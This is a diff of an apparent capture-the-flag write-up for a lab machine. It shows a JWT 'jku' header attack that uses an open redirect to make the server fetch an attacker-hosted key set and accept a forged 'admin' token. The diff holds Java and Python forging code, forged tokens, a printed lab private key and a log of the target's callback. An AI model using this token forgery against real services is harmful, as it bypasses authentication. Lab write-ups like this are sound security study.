@@ -92,7 +92,7 @@ Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWV
 >>> jwt.decode(payload, options={"verify_signature": False})
 {'user': 'blah'}
 ````
-
+:new: http://hackmedia.htb/static/jwks.json
 
 ````json
 {
@@ -109,59 +109,7 @@ Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWV
 }
 ````
 
-Generating a JWK
-````java
-package com.company;
-import java.security.*;
-import java.security.interfaces.*;
-import java.util.*;
-
-import com.google.gson.Gson;
-import com.google.gson.GsonBuilder;
-import com.google.gson.JsonParser;
-import com.nimbusds.jose.jwk.JWK;
-import com.nimbusds.jose.jwk.KeyUse;
-import com.nimbusds.jose.jwk.RSAKey;
-
-public class Main {
-
-    public static void main(String[] args) throws NoSuchAlgorithmException {
-        // write your code here
-        // Generate the RSA key pair
-        KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
-        gen.initialize(2048);
-        KeyPair keyPair = gen.generateKeyPair();
-
-        // Convert to JWK format
-        JWK jwk = new RSAKey.Builder((RSAPublicKey)keyPair.getPublic())
-        .privateKey((RSAPrivateKey)keyPair.getPrivate())
-        .keyUse(KeyUse.SIGNATURE)
-        .keyID(UUID.randomUUID().toString())
-        .build();
-
-        //Printing on screen
-        Gson gson = new GsonBuilder().setPrettyPrinting().create();
-        System.out.println(gson.toJson(JsonParser.parseString(jwk.toJSONString())));
-    }
-}
-````
-
-new JWK
-````json
-{
-  "p": "y2wRyFxKRSh1bQUdViGOX2GWXmRRcmMWUnoIBst8OVhTr79iO2qilGmno5Ca9_9bSQ6PCNpCKZYXugFEUuUIiGlW1IdRdpb_v3YIvPl7IpqCL3UQVkUSSJEXQIi5bkZooOpgduzg7maHzoXAZwb_ZxImFm6ldv4NdJcS85yarsU",
-  "kty": "RSA",
-  "q": "veNZ9gbHv5wG-xnKmjAYrVH2OheotK1BVkNvNh0BwQ3F72QjOilFcQjamaiWK8ueoWrvv5N8-lR1GDsxf-PDkauLzNT3kBpu33D6vedmnEa8RKEKLpP6tTORXt9SStT0tE1HboRwwqMn8hvs-HPwDTSwVNQMLZldll51bZeWwgM",
-  "d": "A-JQ7j0hn7emmxpXCGuAEbQF0iGuJFrc_GZ_vKMF_ynKc0qEI9gwHRCaP-tj8U2u--IIxWNkTwydbZLK-DwT_EZ3UL3l71v1fED6JGlG93R_cA4sekRaKFumPbP7j_8jQPdkx7i63FJVE3qWdF15TbQsVnpLYloAla8LW9RfRYrF7Cy0uzncVnqh_vITzST0lNlchAAisr3xpY2wZs71aUGcwj4sIjMuk3qn4fBvewaemg-b0NmylTFwHeQknfhuMgaMyOopW_zCzw8sV2tEH3tSEwSikHFM8qU0kSTiisFKezqPi6UxRMPsFxw1i8X6EAUVGWkRTz24x4bVFmqTOQ",
-  "e": "AQAB",
-  "use": "sig",
-  "kid": "d763bd50-698a-44d6-802e-920b37ea1fd3",
-  "qi": "SqRQjiUx9yp-3qZ0KNQz-F-tS76NlajEhxgD_-heqapDIPD4UuY1cTJFqQVgk2pVu9r8QmgA249T7c1M8qzilxvbssJBcLRV2L7QHIPnabHP7TEpU_KHlchNQEEd_RBcTLi3_wep5dBiOB-aMxkjx-3uJynWUDjufI209Mb0ArU",
-  "dp": "YGFMr5yih8_aixPQSX3OofxvrTtkp4ixC9TLtsR0kAr8Y5mO5k3ox96jUcjy06uGSb__HxeiH2gAx91PzOK9PzyBqmKOw1xZwhIfo8GkiMmiAvA5FFbXidBMrwPYr5nmes9xcwdarzmfAMe4WFglbGVZ7GjyNsW6BFKL5SZ-120",
-  "dq": "HKNZQf2ryn4hn2U4ZSCz2A_wbrp6uyUWIYhyEVs2lIMbQwt7NJ5c1rtbHKmMXHaNKhMSrXX091wdfNYQlRUovaN9phrIa3dRGWnUpydrFk6kvkT7YCL5QLLSTdiodJjBfx_YkhZvWyt4Ls9_Yck6fwNfRKvmWkozDyaX1ztxhTk",
-  "n": "luNxcMI3qzbUkABS-Fd7QDQhGsinO3x8Unkdw2p40fzoCUBoJ4EhugAzERfNuYgpg2rHT2OnJGh5uyO-TAiIBTpcckyVgvFolk0l_wBcX9LqFJQwBPtcOB4jG4AdvVY7MqFsEALR4FBV3HCWYDKiPwxMRs-SO2RyrKI5zA-lPcZF7QgH0rIMGl8KH9PemRbYxg3KAl-gcbX0PBM6jkGdj67K-N6XxxfwmzZrcf6E-2Y1PPq-LfA4iZX5Ij9FXy_6SJfKGYH5NcZzx0ufFaF8hwVUHmfY7asFWPC8SqzVIDH3-IjnwAlyNR2YugChfPzIfyiIeJcLX0agUUghqK9WTw"
-}
-````
+## JKU claims misuse
 
 jwks.json
 ````json
@@ -180,104 +128,6 @@ jwks.json
 ````
 
 Using the function http://hackmedia.htb/redirect/?url=google.com it is possible to redirect the server to retrieve our JWT
-
-JWK and JWT
-````java
-package com.company;
-import java.net.URI;
-import java.net.URISyntaxException;
-import java.security.*;
-import java.security.interfaces.*;
-import java.util.*;
-
-import com.google.gson.Gson;
-import com.google.gson.GsonBuilder;
-import com.google.gson.JsonParser;
-import com.nimbusds.jose.jwk.JWK;
-import com.nimbusds.jose.jwk.KeyUse;
-import com.nimbusds.jose.jwk.RSAKey;
-import com.nimbusds.jwt.JWTClaimsSet;
-
-import com.nimbusds.jose.*;
-import com.nimbusds.jose.crypto.*;
-import com.nimbusds.jose.jwk.gen.*;
-import com.nimbusds.jwt.*;
-
-public class Main {
-
-    public static void main(String[] args) throws URISyntaxException, JOSEException, NoSuchAlgorithmException {
-        jwkGen();
-
-        jwtGen();
-    }
-
-    public static void jwtGen()throws JOSEException, URISyntaxException  {
-        //JWT
-        //header
-        RSAKey rsaJWK = new RSAKeyGenerator(2048)
-                .keyID("1337")
-                .generate();
-        RSAKey rsaPublicJWK = rsaJWK.toPublicJWK();
-
-        JWSSigner signer = new RSASSASigner(rsaJWK);
-
-        // payload
-        JWTClaimsSet payload = new JWTClaimsSet.Builder()
-                .claim("user","admin")
-                .build();
-
-        //signature
-        SignedJWT signedJWT = new SignedJWT(
-                new JWSHeader.Builder(JWSAlgorithm.RS256)
-                        .jwkURL(new URI("http://hackmedia.htb/static/../redirect?url=10.10.15.6/jwks.json"))
-                        .type(JOSEObjectType.JWT)
-                        .build(),
-                payload
-        );
-
-        signedJWT.sign(signer);
-
-        String serialized = signedJWT.serialize();
-
-        //System.out.println(payload.toJSONObject());
-        System.out.println(serialized);
-    }
-
-    public static void jwkGen() throws NoSuchAlgorithmException {
-        //JWK
-        // Generate the RSA key pair
-        KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
-        gen.initialize(2048);
-        KeyPair keyPair = gen.generateKeyPair();
-
-        // Convert to JWK format
-        JWK jwk = new RSAKey.Builder((RSAPublicKey) keyPair.getPublic())
-                .privateKey((RSAPrivateKey) keyPair.getPrivate())
-                .keyUse(KeyUse.SIGNATURE)
-                .keyID(UUID.randomUUID().toString())
-                .build();
-
-        //Printing on screen
-        Gson gson = new GsonBuilder().setPrettyPrinting().create();
-        System.out.println(gson.toJson(JsonParser.parseString(jwk.toJSONString())));
-    }
-}
-````
-
-````
->>> payload = "eyJqa3UiOiJodHRwOlwvXC9oYWNrbWVkaWEuaHRiXC9zdGF0aWNcLy4uXC9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNlwvandrcy5qc29uIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJ1c2VyIjoiYWRtaW4ifQ.XuHzSnUdJHFFGhKbH-j4uToX_F0cgTER03mtFbkSv_HuA2OqpdwqoKV8TDrSkTYX-SeKFeoGAl3JtvlGoqGTMUcYTZ0aVYCSQd88yZ39dI87Gf_mH24JTmK6-21IKpFUEbNpI3gcyRuUoucQUmcXQAUAhEWxVGE_Cc2juglSq0mnn_UcjLzo6HtcPJSrx2csA7_f5qVmv-_LkSOAuXyGY4Q93mMH_ttmvUv_kbY4rUgn5-H1DNhLm1JeVC18DJ-uA5RsKc9WReVbH3zIfkE8RAScSZulxW2n44RGQgBjwkvlorPdmBlAaMQDOOrGSCjtqYAz6sTYjlvYG9Qpq-bDWQ"
->>> 
->>> jwt.get_unverified_header(payload);
-{'jku': 'http://hackmedia.htb/static/../redirect?url=10.10.15.6/jwks.json', 'typ': 'JWT', 'alg': 'RS256'}
->>> jwt.decode(payload, options={"verify_signature": False})
-{'user': 'admin'}
-````
-
-
-
-````
-eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.rhyqiURChTIPRQ0Lih_NnK56GzVgosn-N3l5u8R0s3CKo61Y3H-GcLRxrvXEHoWuKuwFQmU2rGzsZjmM_Jj8OsbwZc8-nQZJvIDl1fH7I4nMpph-MrXVJHiN9saRvByji6DQgQMcHYgfoH6SfeblGc9ta_MDFkW7ju1njpIB3OU8W8giNP2ZUC_y2RE8SezWi5FcrzNH8WYKRiHbUNovEGK-ACeUZDo4nxbUGPQabEAtDE6nlE7nSfQLcK0RdSTMQ4mSeDajdOHDPyCo1XrzS_I42h8bRJ_y0H50805Yee2v4fslsNlPvq19__TeYpuHEZRbTZ0MU7UL07Oxiy7ykg
-````
 
 ````python
 import json
@@ -301,10 +151,30 @@ serialized = jwt.encode(header=header, payload=payload, key=rsaKey)
 print(serialized)
 ````
 
+````json
+//jku
+{
+  "n": "2Fi6an3ZufhA9erAQcVmlkaWMbwCus3VCk1WAGy3pnPv0kzh3U0rtnb7RsKVpGM0obYlIS2YgqQSQoH1mALD_teZD0AOZtzbqObKr4RDKjuyCkwnEkjO26BkdGpkBJAJkjRFwp3iCHT2EVU9T961MdPNK0ipEooAR7j-ztlxE3nZ3Lzynl0akIAOpZqgiGLy1z_qJkohg8v-AJKZzva3mfYagRMIMvu5PxRU9lO-dB1z9MVBmhHdQV_cr_D8SmyzwkU0oyH0LiwLONpEvTvvnzen2yTf1DZWMswSTI_tNB70QzaVwGvvP5CEEwGCBwNKUu2jPrtjsM3tmLM1YR4o5Q",
+  "e": "AQAB",
+  "kty": "RSA",
+  "kid": "SKjzQRS3IklFQNxIVBWDu4rIP8yvFH8z9SBxcGwzZ9I"
+}
+````
+
+````python
+##jwt
+b'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.izcfGUdFu6U8qPV2-yfRHSCQ0plQOrYk9rMZi7Awn9ow8WCzr5UsSPh18wKPaRzkH3eGQRcih6JSl4fwTUuPUjrh_bISSj6QIQJdCTe01K220nTT1_P8xFMu39dFpwFkdhOwAqRorcLpKjFryMkcXkiQNrwpYPA-eMn6b1DFRwbA3baOGyC8a2pGYUetCgFts_K7h8I_lywBCqS0vMQAeOCw53iskkMUANuJE48wS6gfOXvRane3irAjEqx4NI2QiMzUrFzkJLGFPkP79RyzqlXs1JxyVgjcvprMfapDLip_KEOULDXvsBMJfdBe5yyXOSnnzGQmc3MWxSh4RBBz2Q'
+````
+
+
+````
+10.10.11.126 - - [25/Mar/2022 06:23:02] "GET /jwks.json HTTP/1.1" 200 -
+````
 
 # Root
 
 # Secrets
 
 
-https://connect2id.com/products/nimbus-jose-jwt/examples
+https://docs.authlib.org/en/latest/jose/index.html
+
